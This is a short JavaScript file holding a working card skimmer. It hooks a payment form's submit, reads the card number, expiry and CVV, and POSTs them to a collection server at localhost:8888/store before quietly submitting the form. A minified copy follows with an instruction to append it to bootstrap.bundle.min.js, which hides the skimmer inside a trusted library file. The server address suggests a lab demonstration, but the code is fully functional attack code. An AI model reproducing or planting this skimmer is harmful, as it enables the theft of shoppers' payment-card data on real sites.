//payload that performs the skimming function: sends stolen info to malicious server

window.onload = function () {
    const paymentForm = document.querySelector('form[action="/process_payment"]');
    if (paymentForm) {
        paymentForm.addEventListener('submit', (e) => {
            e.preventDefault(); //prevent default submit behaviour to intercept card details and send to malicious server

            const cardNo = document.getElementById('card_number');
            const cardExp = document.getElementById('card_expiry');
            const cardCvv = document.getElementById('card_cvv');

            console.log(JSON.stringify(
                {
                    number: cardNo.value,
                    expiry: cardExp.value,
                    cvv: cardCvv.value
                }));
            fetch('http://localhost:8888/store', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(
                    {
                        number: cardNo.value,
                        expiry: cardExp.value,
                        cvv: cardCvv.value
                    }
                )
            })
                .then(() => {
                    paymentForm.submit(); //after sending card info to our server successfully, thn submit the form

                })
                .catch((err) => {
                    console.log(err);
                })
        })
    }
}

//append this to `bootstrap.bundle.min.js` file
window.onload = function () { const paymentForm = document.querySelector('form[action="/process_payment"]'); if (paymentForm) {paymentForm.addEventListener('submit', (e) => {e.preventDefault(); const cardNo = document.getElementById('card_number'); const cardExp = document.getElementById('card_expiry'); const cardCvv = document.getElementById('card_cvv'); console.log(JSON.stringify({number: cardNo.value,expiry: cardExp.value,cvv: cardCvv.value}));fetch('http://localhost:8888/store', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({number: cardNo.value,expiry: cardExp.value,cvv: cardCvv.value})}).then(() => {paymentForm.submit(); }).catch((err) => {console.log(err);})})}}
